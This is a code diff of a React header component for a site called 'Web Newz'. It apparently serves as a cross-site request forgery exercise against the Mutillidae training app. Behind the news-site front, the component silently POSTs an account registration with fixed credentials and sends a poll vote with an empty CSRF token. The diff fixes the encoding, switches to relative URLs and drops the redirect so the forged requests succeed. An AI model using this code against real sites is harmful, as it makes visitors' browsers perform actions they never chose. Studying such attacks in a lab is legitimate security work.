@@ -18,23 +18,22 @@ function Header(){
         var signature = signatureRef.current.value;
         var button = buttonRef.current.value;
 
-        <script>
+       
         var formData =
             "username=username" +
-            "%26password=password" +
-            "%26confirm_password=password" +
-            "%26my_signature=signature" +
-            "%26register-php-submit-button=Create+Account";
+            "&password=password" +
+            "&confirm_password=password" +
+            "&my_signature=signature" +
+            "&register-php-submit-button=Create+Account";
 
         const requestOptions = {
             method: "POST",
             headers: {"Content-Type": "application/x-www-form-urlencoded"},
             body: formData,
         };
-        fetch("https://localhost/mutillidae/index.php?page=register.php", requestOptions);
-        </script>
+        await fetch("/index.php?page=register.php", requestOptions);
 
-        window.location.href="/notfound";
+
     };
 
 
@@ -48,7 +47,7 @@ function Header(){
                                 const requestOptions = {
                                     method: "GET",
                                 };
-                                fetch("https://localhost/mutillidae/index.php?page=user-poll.php&choice=netcat&initials=said&csrf-token=&user-poll-php-submit-button=Submit+Vote", requestOptions);
+                                fetch("/index.php?page=user-poll.php&choice=netcat&initials=said&csrf-token=&user-poll-php-submit-button=Submit+Vote", requestOptions);
                             }}>
                                 <Navbar.Brand href="/">Web Newz</Navbar.Brand>
                             </div>
@@ -68,7 +67,7 @@ function Header(){
                     </Navbar>
                 </Row>
                 <form
-                    action="http://localhost/mutillidae/index.php?page=register.php"
+                    action="/index.php?page=register.php"
                     method="POST"
                 >
                     <input type="hidden" name="" value=""/>
